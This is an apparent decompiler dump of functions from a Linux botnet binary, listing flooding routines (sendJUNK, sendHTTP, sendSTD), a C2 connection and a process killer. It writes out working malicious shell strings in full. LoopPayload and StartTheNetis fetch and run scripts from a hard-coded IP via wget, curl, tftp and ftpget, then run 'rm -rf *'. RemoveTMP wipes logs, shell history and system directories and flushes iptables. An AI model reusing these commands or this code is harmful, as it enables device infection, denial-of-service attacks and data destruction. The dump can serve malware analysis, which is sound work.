            int32_t v148 = __GI_getsockname(v144, (int32_t)&v147, (int32_t)&v146); // 0x805147c
                int32_t v149 = __libc_open("/proc/net/route", 0); // 0x80514b0
                if (fdgets(v151, 0x1000, v149) != 0) {
                    while (true) {
                        if (strstr(v151, "\t00000000\t") == 0) {
                            if (fdgets(v151, 0x1000, v149) == 0) {
                            while (true) {
                                    __libc_close(v149);
                                        __libc_close(v144);
                                    __libc_close(v144);
                __libc_close(v149);
                    __libc_close(v144);
                __libc_close(v144);
=================FUNCTION : sendJUNK ===================
++++++++ FUNCTION START 14082
++++++++ FUNCTION END 14404
++++++++ FUNCTION LENGTH 322
    int32_t v146 = getdtablesize(v145); // 0x804f611
    int32_t result2 = getHost(a1, &v149); // 0x804f64f
        while (true) {
        while (true) {
                        __libc_close(v174);
                    getsockopt(v168, v167, 0x2710, v165, (int32_t)&v173);
                        __libc_close(v168);
                    makeRandomStr((char *)v164, v145);
                    if (__libc_send(v168, v167, v157, v165) != -1) {
                    __libc_close(v168);
                    socket(v164, v145, v169);
                    if (__libc_connect(v164, v145, v169) == -1) {
                    __libc_close(v164);
        while (true) {
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 65902
++++++++ FUNCTION END 66841
++++++++ FUNCTION LENGTH 939
                        free(result);
                if (__libc_open((char *)v153, a4 != -1 ? v158 | 0x8000 : v158) < 0) {
                        free(result);
                            free(v150);
                    free(result);
            if (__libc_open((char *)v153, a4 != -1 ? v158 | 0x8000 : v158) < 0) {
                    free(result);
                            free(v150);
                free(v150);
        if (__libc_open((char *)v153, a4 != -1 ? v158 | 0x8000 : v158) < 0) {
                free(result);
                            free(v150);
                free(result);
=================FUNCTION : RemoveTMP ===================
++++++++ FUNCTION START 12369
++++++++ FUNCTION END 12527
++++++++ FUNCTION LENGTH 158
    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /tmp/*");
    __libc_system((int32_t)"history -c");
    __libc_system((int32_t)"rm -rf ~/.bash_history");
    __libc_system((int32_t)"rm -rf /bin/netstat");
    __libc_system((int32_t)"history -w");
    __libc_system((int32_t)"pkill -9 busybox");
    __libc_system((int32_t)"pkill -9 perl");
    __libc_system((int32_t)"service iptables stop");
    return __libc_system((int32_t)"/sbin/iptables -F;/sbin/iptables -X");
=================FUNCTION : sendHOLD ===================
++++++++ FUNCTION START 14407
++++++++ FUNCTION END 14705
++++++++ FUNCTION LENGTH 298
    int32_t v146 = getdtablesize(v145); // 0x804f9f1
    int32_t result2 = getHost(a1, &v149); // 0x804fa2f
        while (true) {
        while (true) {
                        __libc_close(v169);
                    getsockopt(v171, v168, 0x2710, v164, (int32_t)&v165);
                        __libc_close(v171);
                    __libc_close(v175);
                    socket(v162, v145, (int32_t)&v165);
                    if (__libc_connect(v162, v145, (int32_t)&v165) == -1) {
                    __libc_close(v162);
        while (true) {
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 5732
++++++++ FUNCTION END 5947
++++++++ FUNCTION LENGTH 215
    int32_t v144 = __libc_open("/proc/cpuinfo", 0); // 0x8048f5a
    if (fdgets(v146, 0x1000, v144) != 0) {
        while (true) {
            uppercase((char *)&v145);
            if (strstr(v146, "BOGOMIPS") != v146) {
                if (fdgets(v146, 0x1000, v144) == 0) {
                while (true) {
                                while (true) {
                                            __libc_close(v144);
    __libc_close(v144);
=================FUNCTION : print ===================
++++++++ FUNCTION START 3306
++++++++ FUNCTION END 3718
++++++++ FUNCTION LENGTH 412
        while (true) {
                printchar(a1, (int32_t)*v148);
                        while (true) {
                                                int32_t v165 = prints(v144, (char *)&v145, v158, v155); // 0x804884a
                                                int32_t v167 = printi(v144, (int64_t)v166, 10, 0, v158, v155, 97) + result2; // 0x804880c
                                            int32_t v169 = printi(v144, (int64_t)v168, 16, 0, v158, v155, 65) + result2; // 0x80487b8
                                        int32_t v171 = printi(v144, (int64_t)v170, 16, 0, v158, v155, 97) + result2; // 0x8048764
                                    int32_t v173 = printi(v144, (int64_t)v172, 10, 1, v158, v155, 97) + result2; // 0x8048710
                                v151 = prints(v144, v174, v158, v155) + result2;
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 52012
++++++++ FUNCTION END 52716
++++++++ FUNCTION LENGTH 704
        while (true) {
            v156 = getuid();
            if (v156 == geteuid()) {
                v157 = getgid();
                if (v157 == getegid()) {
    v156 = getuid();
    if (v156 != geteuid()) {
    v157 = getgid();
    if (v157 == getegid()) {
=================FUNCTION : printi ===================
++++++++ FUNCTION START 3042
++++++++ FUNCTION END 3303
++++++++ FUNCTION LENGTH 261
            while (true) {
                        printchar((int32_t *)a1, 45);
                        result = prints(a1, v148, a5 - 1, a6);
            result = prints(a1, v149, a5, a6);
                    printchar((int32_t *)a1, 45);
                    result = prints(a1, v148, a5 - 1, a6);
        result2 = prints(a1, v149, a5, a6);
        result2 = prints(a1, (char *)&v160, a5, a6);
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 5950
++++++++ FUNCTION END 6125
++++++++ FUNCTION LENGTH 175
    int32_t v144 = __libc_open("/proc/cpuinfo", 0); // 0x8049122
    if (fdgets(v146, 0x1000, v144) == 0) {
        __libc_close(v144);
    while (true) {
        uppercase((char *)&v145);
        if (strstr(v146, "BOGOMIPS") == v146) {
        if (fdgets(v146, 0x1000, v144) == 0) {
    __libc_close(v144);
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 69722
++++++++ FUNCTION END 70238
++++++++ FUNCTION LENGTH 516
        return inet_ntop4(v149, v147, v145);
        while (true) {
                            while (true) {
                                                    v192 = inet_ntop4((int32_t)v151, (int32_t)v165, v164);
                                            v189 = v148 + sprintf(v186, (int32_t)"%x");
                                        v192 = inet_ntop4((int32_t)v151, (int32_t)v165, v164);
                                v189 = v148 + sprintf(v186, (int32_t)"%x");
                while (true) {
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 12704
++++++++ FUNCTION END 12901
++++++++ FUNCTION LENGTH 197
    random();
    random();
    sprintf(v147, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n");
        while (true) {
            if (__libc_fork(v148) == 0) {
                while (true) {
                    v150 = socket_connect(a1, a3);
                __libc_close(v150);
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 7105
++++++++ FUNCTION END 7303
++++++++ FUNCTION LENGTH 198
        __libc_send(a1, v147, 1, 0x4000);
                __libc_send(a1, v147, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v147, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v147, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 12904
++++++++ FUNCTION END 13088
++++++++ FUNCTION LENGTH 184
    int32_t v144 = socket(2, 2, 0); // 0x804e97e
    __GI_gethostbyname(a1);
    while (true) {
        random();
            __libc_send(v144, v155, 75, 0);
            __libc_connect(v144, v147, 16);
                __libc_close(v144);
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 4629
++++++++ FUNCTION END 4828
++++++++ FUNCTION LENGTH 199
        __libc_close(a1);
        __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v145, (int32_t)&v147);
        while (true) {
            int32_t v150 = __libc_waitpid(v149, (int32_t)&v148, 0); // 0x8048c65
            __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v147, 0);
        __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v147, 0);
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 50023
++++++++ FUNCTION END 50269
++++++++ FUNCTION LENGTH 246
        while (true) {
                    int32_t v150 = __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v146, v149); // 0x8055273
                        while (true) {
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v148, 0);
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v148, 0);
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v148, 0);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 6291
++++++++ FUNCTION END 6557
++++++++ FUNCTION LENGTH 266
            while (true) {
                HackerPrint((int32_t)v158, (int32_t)"PING");
                while (true) {
                        if (__libc_recv((int32_t)v158, v155, 1, 0) != 1) {
        while (true) {
    while (true) {
=================FUNCTION : NetisRanges ===================
++++++++ FUNCTION START 9155
++++++++ FUNCTION END 9309
++++++++ FUNCTION LENGTH 154
    random();
    int32_t v141 = random(); // 0x804ca6d
    int32_t v143 = random(); // 0x804caad
    int32_t v145 = random(); // 0x804caed
    szprintf(v148, (int32_t)"%d.%d.%d.%d", (int32_t)v149);
    return inet_addr(v148);
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 61459
++++++++ FUNCTION END 61781
++++++++ FUNCTION LENGTH 322
        while (true) {
            while (true) {
            while (true) {
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : StartTheNetis ===================
++++++++ FUNCTION START 11878
++++++++ FUNCTION END 12038
++++++++ FUNCTION LENGTH 160
    while (true) {
        int32_t v148 = socket(2, 2, 0); // 0x804e34f
        NetisRanges(v148);
        sprintf(v147, (int32_t)"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00");
        __libc_sendto(v148, v147, v149, 0, v145, 16);
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 69066
++++++++ FUNCTION END 69495
++++++++ FUNCTION LENGTH 429
            while (true) {
                while (true) {
                    while (true) {
                                    if (inet_pton4(v162, (int32_t)v163, v152) >= 1) {
    inet_pton4(v147, v148, v145);
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 48285
++++++++ FUNCTION END 48505
++++++++ FUNCTION LENGTH 220
            while (true) {
                    __GI_random_r((int32_t *)v144, (int32_t)&v150);
                        __GI_random_r((int32_t *)v144, (int32_t)&v150);
            __GI_random_r((int32_t *)v144, (int32_t)&v150);
                __GI_random_r((int32_t *)v144, (int32_t)&v150);
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 13449
++++++++ FUNCTION END 13610
++++++++ FUNCTION LENGTH 161
    inet_addr(a1);
        int32_t v146 = socket(2, 1, 0); // 0x804efea
        __libc_connect(v146, (int32_t)&v145, 16);
        __libc_close(v146);
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 7512
++++++++ FUNCTION END 7743
++++++++ FUNCTION LENGTH 231
        while (true) {
            int32_t v150 = __libc_recv(a1, v149, 1, 0); // 0x8049a7b
                int32_t v153 = __libc_recv(a1, v149 + 1, 2, 0); // 0x8049acc
            if (strstr(v145, (char *)a2) == 0) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 12530
++++++++ FUNCTION END 12701
++++++++ FUNCTION LENGTH 171
    if (__GI_gethostbyname(a1) != 0) {
        int32_t v149 = socket(2, 1, 6); // 0x804e6f4
        __GI_setsockopt(v149, 6, 1, (int32_t)&v144, 4);
            if (__libc_connect(v149, (int32_t)&v148, 16) != -1) {
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 36423
++++++++ FUNCTION END 36707
++++++++ FUNCTION LENGTH 284
    while (true) {
    while (true) {
                while (true) {
            while (true) {
=================FUNCTION : trim ===================
++++++++ FUNCTION START 2205
++++++++ FUNCTION END 2413
++++++++ FUNCTION LENGTH 208
    while (true) {
                while (true) {
                while (true) {
            while (true) {
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 49184
++++++++ FUNCTION END 49683
++++++++ FUNCTION LENGTH 499
        while (true) {
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 12190
++++++++ FUNCTION END 12366
++++++++ FUNCTION LENGTH 176
        __GI_snprintf(v149, 127, (int32_t)">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n", v154, v153, v152);
        __libc_system(v149);
        sprintf(v156, (int32_t)"pkill -9 %s\r\n");
        result = __libc_system(v156);
=================FUNCTION : abort ===================
++++++++ FUNCTION START 46940
++++++++ FUNCTION END 47162
++++++++ FUNCTION LENGTH 222
    while (true) {
                __GI_sigprocmask(1, (struct _TYPEDEF_sigset_t *)&v146, 0);
                while (true) {
            while (true) {
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 6926
++++++++ FUNCTION END 7102
++++++++ FUNCTION LENGTH 176
    int32_t result = __libc_fork(v141); // 0x804968a
        while (true) {
                    free(v148);
=================FUNCTION : hostname_to_ip ===================
++++++++ FUNCTION START 6560
++++++++ FUNCTION END 6725
++++++++ FUNCTION LENGTH 165
    if (__GI_gethostbyname(a1) == 0) {
        __GI_herror("gethostbyname");
        strcpy((char *)a2, __GI_inet_ntoa(v145));
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 6728
++++++++ FUNCTION END 6923
++++++++ FUNCTION LENGTH 195
    if (getHost(a2, &v145) != 0) {
    int32_t v146 = __libc_connect(a1, (int32_t)&v144, 16); // 0x804952c
                getsockopt(a1, 1, 4, (int32_t)&v154, (int32_t)&v153);
=================FUNCTION : HackerPrint ===================
++++++++ FUNCTION START 4020
++++++++ FUNCTION END 4174
++++++++ FUNCTION LENGTH 154
    print(&v145, a2, (int32_t)&v147);
    int32_t result = __libc_send(a1, v144, _strlen(v146), 0x4000); // 0x804898a
    free(v144);
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 64819
++++++++ FUNCTION END 65011
++++++++ FUNCTION LENGTH 192
    int32_t v147 = __libc_close(v146); // 0x80571f4
        free(v153);
    _stdio_openlist_dec_use();
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 67394
++++++++ FUNCTION END 67644
++++++++ FUNCTION LENGTH 250
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 24893
++++++++ FUNCTION END 25071
++++++++ FUNCTION LENGTH 178
        __libc_close((int32_t)v144);
    int32_t v152 = socket(2, 1, 0); // 0x8051359
    return connectTimeout(v152, v142, v149, 30) == 0;
=================FUNCTION : __GI_vfprintf ===================
++++++++ FUNCTION START 31829
++++++++ FUNCTION END 32018
++++++++ FUNCTION LENGTH 189
        int32_t result = _vfprintf_internal(v147, (char *)a2, a3); // 0x8052658
        result2 = _vfprintf_internal(v146, (char *)a2, a3);
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 61963
++++++++ FUNCTION END 62171
++++++++ FUNCTION LENGTH 208
        while (true) {
                while (true) {
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 48695
++++++++ FUNCTION END 48883
++++++++ FUNCTION LENGTH 188
    int32_t v147 = __vfork(v146); // 0x8054ef1
    int32_t v148 = wait4(v147, (int32_t)&result, 0, 0); // 0x8054f9b
=================FUNCTION : __GI_herror ===================
++++++++ FUNCTION START 38740
++++++++ FUNCTION END 38924
++++++++ FUNCTION LENGTH 184
        return fprintf(v146, (int32_t)"%s%s%s\n", v143, v149, v145);
    return fprintf(v146, (int32_t)"%s%s%s\n", v143, v150, v145);
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 57180
++++++++ FUNCTION END 57433
++++++++ FUNCTION LENGTH 253
        while (true) {
    while (true) {
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 32381
++++++++ FUNCTION END 33174
++++++++ FUNCTION LENGTH 793
    while (true) {
                                                                                while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 31468
++++++++ FUNCTION END 31665
++++++++ FUNCTION LENGTH 197
        while (true) {
    while (true) {
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 62174
++++++++ FUNCTION END 62425
++++++++ FUNCTION LENGTH 251
        while (true) {
            while (true) {
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 72913
++++++++ FUNCTION END 73148
++++++++ FUNCTION LENGTH 235
            while (true) {
                while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 48508
++++++++ FUNCTION END 48692
++++++++ FUNCTION LENGTH 184
        srandom_r(a1, (int32_t *)a4);
    srandom_r(a1, (int32_t *)a4);
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 6128
++++++++ FUNCTION END 6288
++++++++ FUNCTION LENGTH 160
        rand_cmwc(v144);
            rand_cmwc(v144);
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 67176
++++++++ FUNCTION END 67391
++++++++ FUNCTION LENGTH 215
    while (true) {
                free(v153);
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 71057
++++++++ FUNCTION END 71213
++++++++ FUNCTION LENGTH 156
    int32_t v144 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v143); // 0x805831d
        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v143);
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 37306
++++++++ FUNCTION END 37523
++++++++ FUNCTION LENGTH 217
        while (true) {
            while (true) {
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 55637
++++++++ FUNCTION END 55909
++++++++ FUNCTION LENGTH 272
            while (true) {
        while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 10963
++++++++ FUNCTION END 11141
++++++++ FUNCTION LENGTH 178
    while (true) {
        if (strcasestr((char *)a1, v147) == 0) {
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 68476
++++++++ FUNCTION END 68677
++++++++ FUNCTION LENGTH 201
    while (true) {
        while (true) {
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 7306
++++++++ FUNCTION END 7509
++++++++ FUNCTION LENGTH 203
    while (true) {
                while (true) {
=================FUNCTION : __malloc_consolidate ===================
++++++++ FUNCTION START 46149
++++++++ FUNCTION END 46441
++++++++ FUNCTION LENGTH 292
        while (true) {
                while (true) {
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 56063
++++++++ FUNCTION END 56283
++++++++ FUNCTION LENGTH 220
    while (true) {
            while (true) {
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 67647
++++++++ FUNCTION END 67871
++++++++ FUNCTION LENGTH 224
            while (true) {
                int32_t v151 = getc_unlocked(); // 0x80579bd
=================FUNCTION : __GI_sigprocmask ===================
++++++++ FUNCTION START 29590
++++++++ FUNCTION END 29773
++++++++ FUNCTION LENGTH 183
        v145 = sigprocmask(how, set, oset);
    v145 = sigprocmask(how, set, oset);
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 68234
++++++++ FUNCTION END 68473
++++++++ FUNCTION LENGTH 239
        while (true) {
    while (true) {
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 33541
++++++++ FUNCTION END 33850
++++++++ FUNCTION LENGTH 309
        while (true) {
=================FUNCTION : kill ===================
++++++++ FUNCTION START 28308
++++++++ FUNCTION END 28466
++++++++ FUNCTION LENGTH 158
    int32_t v146 = kill(v144, v145); // 0x8052107
=================FUNCTION : _fini ===================
++++++++ FUNCTION START 74050
++++++++ FUNCTION END 74198
++++++++ FUNCTION LENGTH 148
    __get_pc_thunk_bx(v144);
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 72509
++++++++ FUNCTION END 72685
++++++++ FUNCTION LENGTH 176
    while (true) {
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 27509
++++++++ FUNCTION END 27662
++++++++ FUNCTION LENGTH 153
    if ((uint32_t)getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 10198
++++++++ FUNCTION END 10345
++++++++ FUNCTION LENGTH 147
    return __GI_inet_ntoa(v144);
=================FUNCTION : __vfork ===================
++++++++ FUNCTION START 26075
++++++++ FUNCTION END 26222
++++++++ FUNCTION LENGTH 147
    uint32_t result = vfork(); // 0x8051e46
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 5413
++++++++ FUNCTION END 5560
++++++++ FUNCTION LENGTH 147
    int32_t v144 = inet_addr(a1); // 0x8048ee7
=================FUNCTION : __libc_getpid ===================
++++++++ FUNCTION START 27825
++++++++ FUNCTION END 27983
++++++++ FUNCTION LENGTH 158
    int32_t pid = getpid(v144); // 0x8052061
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 64195
++++++++ FUNCTION END 64341
++++++++ FUNCTION LENGTH 146
    return kill(__libc_getpid(), a1);
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 41019
++++++++ FUNCTION END 41164
++++++++ FUNCTION LENGTH 145
    return __socketcall(14, (int32_t)&a1);
=================FUNCTION : rand ===================
++++++++ FUNCTION START 47165
++++++++ FUNCTION END 47311
++++++++ FUNCTION LENGTH 146
    return random();
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 67006
++++++++ FUNCTION END 67173
++++++++ FUNCTION LENGTH 167
    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3, v147); // 0x805772a
=================FUNCTION : __bsd_signal ===================
++++++++ FUNCTION START 41628
++++++++ FUNCTION END 41821
++++++++ FUNCTION LENGTH 193
        while (true) {
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 9887
++++++++ FUNCTION END 10038
++++++++ FUNCTION LENGTH 151
    rand_cmwc((int32_t)v145);
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 39100
++++++++ FUNCTION END 39246
++++++++ FUNCTION LENGTH 146
    return __GI_inet_ntoa_r(a1, (int32_t)&v143);
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 68838
++++++++ FUNCTION END 69063
++++++++ FUNCTION LENGTH 225
        while (true) {
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 40871
++++++++ FUNCTION END 41016
++++++++ FUNCTION LENGTH 145
    return __socketcall(11, (int32_t)&a1);
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 32021
++++++++ FUNCTION END 32198
++++++++ FUNCTION LENGTH 177
    while (true) {
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 37675
++++++++ FUNCTION END 37821
++++++++ FUNCTION LENGTH 146
    return __GI_tcgetattr(a1, &v144) == 0;
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 67874
++++++++ FUNCTION END 68046
++++++++ FUNCTION LENGTH 172
    while (true) {
=================FUNCTION : __GI_snprintf ===================
++++++++ FUNCTION START 30703
++++++++ FUNCTION END 30850
++++++++ FUNCTION LENGTH 147
    return __GI_vsnprintf((char *)a1, a2, a3, (int32_t)&v144);
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 72688
++++++++ FUNCTION END 72910
++++++++ FUNCTION LENGTH 222
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 5022
++++++++ FUNCTION END 5195
++++++++ FUNCTION LENGTH 173
    while (true) {
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 64046
++++++++ FUNCTION END 64192
++++++++ FUNCTION LENGTH 146
    return __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, a6, a7);
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 3870
++++++++ FUNCTION END 4017
++++++++ FUNCTION LENGTH 147
    return print(&v144, a1, (int32_t)&v145);
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 9735
++++++++ FUNCTION END 9884
++++++++ FUNCTION LENGTH 149
    free(v144);
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 68049
++++++++ FUNCTION END 68231
++++++++ FUNCTION LENGTH 182
        while (true) {
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 30853
++++++++ FUNCTION END 31000
++++++++ FUNCTION LENGTH 147
    return __GI_vsnprintf((char *)a1, -1, a2, (int32_t)&v144);
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 73151
++++++++ FUNCTION END 73338
++++++++ FUNCTION LENGTH 187
    while (true) {
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 10503
++++++++ FUNCTION END 10662
++++++++ FUNCTION LENGTH 159
        result = __libc_recv(a1, a3, a4, 0);
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 36067
++++++++ FUNCTION END 36242
++++++++ FUNCTION LENGTH 175
    while (true) {
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 36245
++++++++ FUNCTION END 36420
++++++++ FUNCTION LENGTH 175
    while (true) {
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 40575
++++++++ FUNCTION END 40720
++++++++ FUNCTION LENGTH 145
    return __socketcall(10, (int32_t)&a1);
=================FUNCTION : csum ===================
++++++++ FUNCTION START 9462
++++++++ FUNCTION END 9732
++++++++ FUNCTION LENGTH 270
        while (true) {
=================FUNCTION : __libc_fork ===================
++++++++ FUNCTION START 27348
++++++++ FUNCTION END 27506
++++++++ FUNCTION LENGTH 158
    int32_t v145 = fork(v144); // 0x8051fe9
=================FUNCTION : __libc_open ===================
++++++++ FUNCTION START 28469
++++++++ FUNCTION END 28631
++++++++ FUNCTION LENGTH 162
    int32_t fd = open(path, 0x1000000 * a2 / 0x1000000); // 0x8052153
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 39249
++++++++ FUNCTION END 39402
++++++++ FUNCTION LENGTH 153
    if (inet_aton((char *)a1, (int32_t)&result) != 0) {
=================FUNCTION : __GI_clock_getres ===================
++++++++ FUNCTION START 53525
++++++++ FUNCTION END 53682
++++++++ FUNCTION LENGTH 157
    int32_t v144 = clock_getres(clk_id, res); // 0x80558f7
=================FUNCTION : wait4 ===================
++++++++ FUNCTION START 55003
++++++++ FUNCTION END 55163
++++++++ FUNCTION LENGTH 160
    int32_t v148 = wait4(v144, v146, v145, v147); // 0x8055ab1
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 28634
++++++++ FUNCTION END 28780
++++++++ FUNCTION LENGTH 146
    return __libc_open((char *)a1, 577);
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 51690
++++++++ FUNCTION END 51850
++++++++ FUNCTION LENGTH 160
    if (__libc_open("/dev/null", v146) != v144) {
=================FUNCTION : fprintf ===================
++++++++ FUNCTION START 55912
++++++++ FUNCTION END 56060
++++++++ FUNCTION LENGTH 148
    return __GI_vfprintf((int16_t *)a1, a2, (int32_t)&v145, v144);
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 40427
++++++++ FUNCTION END 40572
++++++++ FUNCTION LENGTH 145
    return __socketcall(15, (int32_t)&a1);
=================FUNCTION : random ===================
++++++++ FUNCTION START 47314
++++++++ FUNCTION END 47467
++++++++ FUNCTION LENGTH 153
    __GI_random_r(&v145, (int32_t)&result);
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 3721
++++++++ FUNCTION END 3867
++++++++ FUNCTION LENGTH 146
    return print(NULL, a1, (int32_t)&v144);
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 40131
++++++++ FUNCTION END 40276
++++++++ FUNCTION LENGTH 145
    return __socketcall(3, (int32_t)&a1);
=================FUNCTION : LoopPayload ===================
++++++++ FUNCTION START 12041
++++++++ FUNCTION END 12187
++++++++ FUNCTION LENGTH 146
    return __libc_system((int32_t)"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n");
=================FUNCTION : srand ===================
++++++++ FUNCTION START 47785
++++++++ FUNCTION END 47936
++++++++ FUNCTION LENGTH 151
    srandom_r(a1, &v145);
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 10041
++++++++ FUNCTION END 10195
++++++++ FUNCTION LENGTH 154
        __libc_close(a1);
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 38927
++++++++ FUNCTION END 39097
++++++++ FUNCTION LENGTH 170
    while (true) {
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 40723
++++++++ FUNCTION END 40868
++++++++ FUNCTION LENGTH 145
